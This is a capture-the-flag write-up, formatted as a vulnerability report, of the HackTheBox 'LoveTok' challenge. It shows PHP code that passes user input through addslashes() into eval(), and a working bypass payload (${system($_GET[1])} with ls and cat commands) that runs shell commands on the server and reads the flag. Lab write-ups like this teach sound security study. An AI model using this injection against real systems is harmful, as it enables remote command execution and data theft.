# Command Injection via URL parameter in LoveTok

## Issue Description
In some cases, due to insufficient validation in the URL, a command injection vulnerability may occur. By bypassing validation methods that can be found in predictable or open-source projects' source code, a command can be injected.

In this report, I will be explaining a HackTheBox challenge with a vulnerability of command injection via URL parameter.

## Steps to Reproduce
The following steps indicate a proof of concept outlined in seven(7) steps to reproduce and execute the issue.

**Step 1:**
Run `openvpn` command to connect to the HTB (HackTheBox) VPN.

**Step 2:**
Start the LoveTok instance from [HTB LoveTok](https://app.hackthebox.com/challenges/lovetok).

**Step 3:**
Download the necessary files via “Download Files”.

**Step 4:**
Review the source codes of the program within the downloaded files.

**Step 5:**
Observe that it has an insufficient validation in format parameter in TimeController.php file.

**Step 6:**
Change the URL to 
```
http://[HTBHost]/?format=${system($_GET[1])}&1=ls+/ 
```
to see the files in the programs directory. Copy the flag files name.

**Step 7:**
Change the URL to 
```
http://[HTBHost]/?format=${system($_GET[1])}&1=cat+/[file-name-from-step-6]
``` 
to display the flag.

## Proof of Concept
Download your openvpn file from [HTB Labs section](https://app.hackthebox.com/). And run this file in Kali Linux Terminal by command
```
openvpn [your-openvpn-file]
```
Start the instance and download files in .zip format from the buttons seen in Figure 1.1.

| ![Start instance and Download Files](https://user-images.githubusercontent.com/112284234/227717110-754fee99-fe08-438f-9efa-7b83dfb4150f.png) | 
|:--:| 
| *Figure 1.1* |

Navigate to the host IP, in my case it is 138.68.165.141:31107. The host look like in Figure 1.2.

| ![Host IP, How the host looks like](https://user-images.githubusercontent.com/112284234/227718022-8ca48cb2-81cf-4e5b-961c-b8d1a976f336.png) |
|:--:| 
| *Figure 1.2* |

Click the only button which says **Nah, that doesn't work for me. Try again!** to see what happens. It will add an parameter to the URL which is **Host/?format=r** Note that there is a format parameter with method **GET** and continue.

Browse to the downloaded file. Unzip it with `unzip LoveTok.zip`, provide the zip password which is given in the lab: `hackthebox`. When we unzip the file, it will have a structure like in the Figure 1.3.

| ![Downloaded files' structure](https://user-images.githubusercontent.com/112284234/227718486-57b8f38c-7e2d-4e60-b995-695ce62b9770.png) |
|:--:|
| *Figure 1.3* |

Review the `TimeController.php` and `TimeModel.php` source codes.

**TimeController.php** looks like this:
```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'r';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
It gets the format parameter here, and sends to the TimeModal class without any sanitization. If we examine the **TimeModal.php** file, it looks like this:
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

In here, it gets the **format** variable from a constructor variable and sanitizes it with a method `addslashes()`. When we search for `addslashes()` in the web, I found [Aaron's write-up](https://swordandcircuitboard.com/php-addslashes-command-injection-bypass/) to bypass this method. In Aaron's write-up, he says,

> `addslashes()` adds backslashes before single-quotes, double-quotes, backslashes and NUL. This list leaves open the values for variable replacement `${}`. This allows us to write an input that will not be touched by `addslashes()` and then later when it is evaluated it will be replaced with a dangerous command injection input.

And he adds,

>**Step 1**<br><br>
First we'll make our "safe" string to get past addslashes().<br><br>
`${system($_GET[1])}`<br><br>
When evaluated this will call the system method with the value of the query param "1".<br><br>
**Step 2**<br><br>
Now we'll need to set the value of that query param.<br><br>
`1=ls+`/<br><br>
This is simply our command url encoded. Since we used a 'space' character we'd need to replace that with a '+'.

So his final query, and that query that perfectly works for this site,

>Final Query<br><br>
So our final full query will be:<br><br>
`GET /index.php?input=${system($_GET[1])}&1=ls+/`

If we add this query to the `format` parameter in LoveTok, we will see a output like Figure 1.4.

| ![ls command executed](https://user-images.githubusercontent.com/112284234/227719687-3d144f83-4c02-4c6f-a30b-068c147f7f20.png) |
|:--:|
| Figure 1.4 |

And the `ls` command executed in the target machine. If we look at the files and directories on the target machine we see that there is a file called `flag0Bmtl`. To read this file, change the `1` parameter to `cat+/flag0Bmtl`, and the output should look like in the Figure 1.5.

| ![flag found](https://user-images.githubusercontent.com/112284234/227719901-e7ac81cf-641c-48b9-add9-ef92ccdde02a.png) |
|:--:|
| Figure 1.5 |

And we found the flag.

## Impact
This vulnerability will affect the target machine because we can inject and execute commands on the target machine. As represented, we can display every file they have in the machine. Unless some commands are blocked by the target machine, all commands can be executed, and all operations can be performed on the target machine.
